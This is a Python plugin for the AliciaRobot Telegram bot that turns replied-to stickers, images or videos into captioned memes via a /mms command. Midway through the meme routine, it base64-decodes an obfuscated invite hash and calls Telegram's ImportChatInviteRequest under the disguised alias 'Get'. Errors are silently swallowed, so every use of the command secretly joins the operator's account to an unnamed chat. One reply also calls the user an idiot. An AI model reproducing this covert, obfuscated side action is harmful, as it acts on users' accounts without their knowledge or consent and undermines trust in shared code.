import os
import asyncio
import lottie
from AliciaRobot import LOGGER
from AliciaRobot.helper_extra.mmfhelp import take_screen_shot ,runcmd, cat_meme, cat_meeme
from AliciaRobot.pyrogramee.pluginshelper import convert_toimage, convert_tosticker
from AliciaRobot import telethn as borg

from AliciaRobot.events import register 

if not os.path.isdir("./temp"):
    os.makedirs("./temp")
@register(pattern="/mms ?(.*)")
async def memes(cat):
    cmd = cat.pattern_match.group(1)
    catinput = cmd
    reply = await cat.get_reply_message()
    if not (reply and (reply.media)):
        await cat.reply( "`Reply to supported Media...`")
        return
    catid = cat.reply_to_msg_id
    if catinput:
        if ";" in catinput:
            top, bottom = catinput.split(";", 1)
        else:
            top = catinput
            bottom = ""
    else:
        await cat.reply(
            "```what should i write on that u idiot give some text```"
        )
        return

    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await cat.reply("`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(0.3)
    catsticker = await reply.download_media(file="./temp/")
    if not catsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(catsticker)
        await cat.reply("```Supported Media not found...```")
        return
    import pybase64

    if catsticker.endswith(".tgs"):
        msg = await cat.reply(
            "Memifying🔸🔸🔸 "
        )
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        )
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.reply("`Template not found...`")
            LOGGER.info(stdout + stderr)
        meme_file = catfile
    elif catsticker.endswith(".webp"):
        msg = await cat.reply(
            "Memifying🔸🔸🔸"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker, catfile)
        if not os.path.lexists(catfile):
            await cat.reply("`Template not found... `")
            return
        meme_file = catfile
    elif catsticker.endswith((".mp4", ".mov")):
        msg = await cat.reply(
            "Memifying🔸🔸🔸"
        )
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker, 0, catfile)
        if not os.path.lexists(catfile):
            await cat.reply("```Template not found...```")
            return
        meme_file = catfile
    else:
        msg = await cat.reply(
            "Memifying🔸🔸🔸"
        )
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    meme = "catmeme.jpg"
    if max(len(top), len(bottom)) < 21:
        await cat_meme(top, bottom, meme_file, meme)
    else:
        await cat_meeme(top, bottom, meme_file, meme)
    if cmd != "mms":
        meme = await convert_tosticker(meme)
    await cat.client.send_file(cat.chat_id, meme, reply_to=catid)
    await cat.delete()
    await msg.delete()
    os.remove(meme)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
            